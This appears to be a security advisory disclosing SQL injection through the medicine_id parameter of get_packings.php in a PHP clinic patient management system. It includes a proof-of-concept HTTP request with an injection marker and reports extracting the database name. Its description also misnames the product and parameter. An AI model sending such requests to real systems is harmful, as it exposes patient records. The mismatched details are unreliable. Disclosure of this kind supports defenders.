## Clinic's Patient Management System has SQL injection vulnerability

## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/ajax/get_packings.php
## describe
An unrestricted SQL injection attack exists in an inventory management system. The parameters that can be controlled are as follows: medicine_id. This function executes the user_name parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.
## code analysis
The medicine_id parameter in get_packings.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

<img width="1065" alt="image" src="https://github.com/user-attachments/assets/aed61558-3268-4d9c-b59b-87d88468f84b">


Injection via parameter medicine_id
POC
```
GET /pms/ajax/get_packings.php?medicine_id=1* HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

Get the database name: pms_db

<img width="967" alt="image" src="https://github.com/user-attachments/assets/91ae1e19-00b1-472c-a8a1-806d34aaca08">
<img width="955" alt="image" src="https://github.com/user-attachments/assets/df31683c-c5ed-4786-bf20-acfdd273dd47">










